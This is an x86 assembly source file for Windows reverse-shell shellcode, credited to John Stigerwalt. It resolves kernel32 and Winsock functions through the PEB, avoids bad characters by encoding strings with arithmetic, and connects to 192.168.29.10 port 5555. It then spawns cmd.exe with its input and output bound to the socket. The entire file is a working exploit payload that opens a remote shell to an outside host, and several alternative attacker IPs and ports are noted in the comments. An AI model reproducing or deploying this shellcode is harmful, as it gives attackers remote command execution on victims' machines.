; Author: John Stigerwalt
; Reverse Shell Using WS2_32.dll Socket Connect Back
; Modifed for Bad Chars
;

bits 32
start:

sub esp, 0x60	
mov ebp, esp
xor esi, esi

;Find Kernel32.dll
mov ebx, [fs:0x30 + esi]
mov ebx, [ebx + 0x0C]
mov ebx, [ebx + 0x14]
mov ebx, [ebx]
mov ebx, [ebx]
mov ebx, [ebx + 0x10]
mov [ebp + 0x04], ebx

;Find Export Table
mov edx, [ebx + 0x3c]
add edx, ebx
mov edx, [edx + 0x78]
add edx, ebx
mov esi, [edx + 0x20]
add esi, ebx
xor ecx, ecx

;Find GetProcAddress Function Name
Get_Function:
inc ecx
lodsd									;load doubleword at address DS:(E)SI into EAX
add eax, ebx
cmp dword [eax], 0x50746547			;Getp
jnz Get_Function
cmp dword [eax + 0x4], 0x41636f72	;rocA
jnz Get_Function
cmp dword [eax + 0x8], 0x65726464	;ddre
jnz Get_Function
; EAX no longer needed, Was used for counter for ECX to finsih out finding GetProcAddress with counter from ECX. 

;Find GetProcAddress function address
mov esi, [edx + 0x24]
add esi, ebx
mov eax, [esi + ecx * 2]
mov ch, ah
mov cl, al
dec ecx
mov esi, [edx + 0x1c]
add esi, ebx
mov edx, [esi + ecx * 4]
add edx, ebx							;GetProcAddress
mov [ebp + 0x08], edx	;Store GetProcAddress

;Find LoadLibrary function address
xor ecx, ecx
push ebx
push edx
push ecx
PUSH 0x41797261
PUSH 0x7262694c
PUSH 0x64616f4c 							; LoadLibraryA
push esp
push ebx
call edx									; call GetProcAddress
mov [ebp + 0x0C], eax 						;LoadLibraryA Address EBP + 12 dec.

;Find CreateProcess function address
xor ecx, ecx
push ebx
push dword [ebp + 0x08] 					; GetProcAddress
push ecx
;mov cx, 0x4173
mov ch, 0x41
mov cl, 0x73
push ecx
;push word 0x4173	- Fucks stack up for CreateProccessA, need to push in increments of 4 bytes 
PUSH 0x7365636f
PUSH 0x72506574
mov ecx, 0x61657242
inc ecx ; 0x61657243
push ecx
;PUSH 0x61657243 							; CreateProcessA
push esp
push ebx
call dword [ebp + 0x08]						; call GetProcAddress
mov [ebp + 0x10], eax					;CreateProcessA Address

; Get WS2_32.dll
xor ecx, ecx
push ecx

;0x3233
mov ecx, 0x11114244
sub ecx, 0x11111011
push ecx

;0x5f325357
mov ecx, 0x6f426367
sub ecx, 0x10101010 
push ecx
push esp

; LoadLibraryA
;mov ebx, 0x76048940
call [ebp + 0x0C]
mov [ebp + 0x14], eax	; WS2_32.dll address moved to EBP + 0x14

; Get Function Name WSAStartUp
xor ecx, ecx
push ecx
mov ch, 0x70
mov cl, 0x75
push ecx
PUSH 0x74726174
PUSH 0x53415357
push esp

push dword [ebp + 0x14]			; WS2_32.dll address
call [ebp + 0x8] 				; GetProcAddress
mov [ebp + 0x18], eax 			; WSAStartup

;Call WSAStartUp
xor ebx, ebx
xor eax, eax
xor ecx, ecx
;mov bx, 0x0190

;subtract ESP without using bad char \x29
mov ebx, esp
mov ah, 0x01
mov al, 0x90
mov ecx, eax
sub ebx, eax
xchg esp, ebx ; mov ebx into esp and esp into ebx. Smaller than MOV instruction
push esp
push ecx
call [ebp + 0x18]

;Find WSASocket Function
xor ecx, ecx
push ecx
mov ch, 0x41
mov cl, 0x74
push ecx
PUSH 0x656b636f
PUSH 0x53415357
push esp

push dword [ebp + 0x14]			; WS2_32.dll address
call [ebp + 0x8] 				; GetProcAddress
mov [ebp + 0x1C], eax 			; WSASocket

;Call WSASocket Function
xor edx, edx
push edx
push edx
push edx
push edx
inc edx
push edx
inc edx
push edx
call eax						;Called WSASocket Function
mov [ebp + 0x20], eax			;Store vaild socket descriptor

;Find Connect Function
xor ecx, ecx
push ecx
;0x00746365
mov ecx, 0x11857476
sub ecx, 0x11111111
push ecx
PUSH 0x6e6e6f63
push esp

push dword [ebp + 0x14]			; WS2_32.dll address
call [ebp + 0x8] 				; GetProcAddress
mov [ebp + 0x24], eax 			; connect


;IP Network Byte Order - C0A8012E - 192.168.1.46
;IP Network Byte Order - 2E01A8C0 - 192.168.1.42
;IP Network Byte Order - 0A1F018E - 10.31.1.142 - Push it in reverse order
; Port 7777 - 611E - add -> 0102 to end of push. <- Setup the stack for AF_INET argument of 02, first 01 of 0102 will be decremtned by DH and then pushed as 0002 acting as a null and argument 
;Port 5555 - B315

;IP Network Byte Order - 0A1DA8C0 - 192.168.29.10


;Call connect Function
;push 0x8E011F0A
push 0x0A1DA8C0
mov edx, 0xB3150102
dec dh
push edx
mov ecx, esp
xor edx, edx
mov dl, 0x10
push edx
push ecx
push dword [ebp + 0x20]				; ;vaild socket descriptor
call [ebp + 0x24]					; connect Function

;Mov "cmd" to EBP for CreateProcessA Function Call
mov eax, 0x646d6301
sar eax, 0x08
mov [ebp + 0x2C], eax					; Store 'cmd' string 

;CreateProccessA
mov edi, [ebp + 0x20]
push eax
mov ecx, esp
xor edx, edx

sub esp, 16
mov ebx, esp

push edi
push edi
push edi
push edx
push edx
xor edi, edi
inc edi
rol edi, 8
inc edi
push edi
push edx
push edx
push edx
push edx
push edx
push edx
push edx
push edx
push edx
push edx
xor eax, eax
add al, 44
push eax
mov eax, esp	;StartUp info

push ebx
push eax
push edx
push edx
push edx
xor edi, edi
inc edi
push edi
push edx
push edx
push ecx
push edx
call [ebp + 0x10]	;Call CreateProccessA Function

;Find ExitProcess function address
xor ecx, ecx
push dword [ebp + 0x04]
push dword [ebp + 0x08]
push ecx
;mov ecx, 0x00737365
mov ecx, 0x22848476
sub ecx, 0x22111111
push ecx
PUSH 0x636f7250
PUSH 0x74697845 ; ExitProcess
push esp
push dword [ebp + 0x04]
call [ebp + 0x08]	; call GetProcAddress

Exitprocess:
call eax	
